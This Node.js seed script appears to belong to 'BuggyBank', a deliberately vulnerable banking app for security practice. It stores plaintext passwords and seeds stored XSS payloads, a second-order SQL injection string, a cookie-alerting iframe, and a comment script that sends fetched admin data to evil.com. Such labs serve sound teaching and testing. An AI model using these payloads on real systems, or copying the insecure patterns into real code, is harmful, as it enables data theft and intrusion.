const sqlite3 = require('sqlite3').verbose();
const path = require('path');

const DB_PATH = path.join(__dirname, '../buggybank.db');
const db = new sqlite3.Database(DB_PATH);

// Seed data with vulnerabilities
db.serialize(() => {
  // Create users with plaintext passwords and different roles
  const users = [
    ['admin', 'admin123', 'Administrator', 'admin@buggybank.com', 10000.0, 'admin'],
    ['staff', 'staff123', 'Staff Member', 'staff@buggybank.com', 5000.0, 'staff'],
    ['alice', 'password123', 'Alice Johnson', 'alice@example.com', 2500.0, 'user'],
    ['bob', 'qwerty', 'Bob Smith', 'bob@example.com', 1500.0, 'user'],
    ['charlie', '123456', 'Charlie Brown', 'charlie@example.com', 3000.0, 'user'],
    // User with XSS payload in display name (stored XSS vulnerability)
    ['eve', 'hacker', '<script>alert("XSS in displayName")</script>', 'eve@hacker.com', 500.0, 'user'],
    // User with SQL injection attempt in display name (second-order SQLi)
    ['mallory', 'evil', "'; DROP TABLE users; --", 'mallory@evil.com', 100.0, 'user']
  ];

  const userStmt = db.prepare(`
    INSERT INTO users (username, password, displayName, email, balance, role) 
    VALUES (?, ?, ?, ?, ?, ?)
  `);

  users.forEach(user => {
    userStmt.run(user);
  });
  userStmt.finalize();

  // Create sample transactions
  const transactions = [
    [3, 4, 200.0, 'Payment for dinner', 'transfer'],
    [4, 5, 150.0, 'Loan repayment', 'transfer'],
    [5, 3, 100.0, 'Birthday gift', 'transfer'],
    [1, 3, 500.0, 'Admin bonus', 'transfer'],
    [3, null, 100.0, 'ATM withdrawal', 'withdrawal'],
    [4, null, 50.0, 'Bank fee', 'withdrawal']
  ];

  const transactionStmt = db.prepare(`
    INSERT INTO transactions (fromUserId, toUserId, amount, description, type) 
    VALUES (?, ?, ?, ?, ?)
  `);

  transactions.forEach(transaction => {
    transactionStmt.run(transaction);
  });
  transactionStmt.finalize();

  // Create sample budget items with XSS payloads
  const budgets = [
    [3, 'Food', 'Groceries', 500.0, 200.0],
    [3, 'Transport', 'Gas & Public Transport', 300.0, 150.0],
    [4, 'Entertainment', '<img src=x onerror=alert("XSS")>', 200.0, 100.0], // XSS in label
    [5, 'Utilities', 'Power & Water', 400.0, 350.0]
  ];

  const budgetStmt = db.prepare(`
    INSERT INTO budgets (userId, category, label, allocatedAmount, spentAmount) 
    VALUES (?, ?, ?, ?, ?)
  `);

  budgets.forEach(budget => {
    budgetStmt.run(budget);
  });
  budgetStmt.finalize();

  // Create sample comments with XSS payloads for admin review
  const comments = [
    [3, 'Great banking service!'],
    [4, 'Love the new dashboard design.'],
    [6, '<script>fetch("/admin/users").then(r=>r.text()).then(d=>fetch("http://evil.com/steal?data="+btoa(d)))</script>'], // XSS to steal admin data
    [7, '<iframe src="javascript:alert(document.cookie)"></iframe>'] // XSS to steal cookies
  ];

  const commentStmt = db.prepare(`
    INSERT INTO comments (userId, content) 
    VALUES (?, ?)
  `);

  comments.forEach(comment => {
    commentStmt.run(comment);
  });
  commentStmt.finalize();

  // Create sample system messages for WebSocket XSS
  const messages = [
    [null, 'Welcome to BuggyBank! Please review our new security policy.', 'system'],
    [null, '<script>alert("WebSocket XSS!")</script>', 'system'], // XSS via WebSocket
    [1, 'System maintenance scheduled for tonight.', 'admin']
  ];

  const messageStmt = db.prepare(`
    INSERT INTO messages (fromUserId, content, type) 
    VALUES (?, ?, ?)
  `);

  messages.forEach(message => {
    messageStmt.run(message);
  });
  messageStmt.finalize();

  console.log('Database seeded with sample data and vulnerabilities');
});

db.close(); 